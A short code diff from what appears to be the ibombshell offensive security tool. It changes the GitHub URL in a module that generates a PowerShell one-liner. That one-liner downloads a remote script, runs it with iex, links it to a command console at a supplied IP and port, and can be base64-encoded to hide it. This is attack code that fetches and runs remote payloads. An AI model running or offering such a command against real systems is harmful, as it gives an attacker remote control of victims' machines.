@@ -97,7 +97,7 @@ class ModuleGenerate(Module):
         
     def run(self, code, extension):
         output = self.args["output"]
-        code_to_encode = """(iwr -UseBasicParsing -uri 'https://raw.githubusercontent.com/ElevenPaths/ibombshell/Dev/console').Content | iex; console -Silently -uriConsole http://{}:{}""".format(self.args['ip'], self.args['port'])
+        code_to_encode = """(iwr -UseBasicParsing -uri 'https://raw.githubusercontent.com/Telefonica/ibombshell/Dev/console').Content | iex; console -Silently -uriConsole http://{}:{}""".format(self.args['ip'], self.args['port'])
         if self.args["base64"] and (self.args["base64"].lower() == "yes"):
             code_encode = b64encode(code_to_encode.encode('UTF-16LE'))
             code_encode = code_encode.decode()
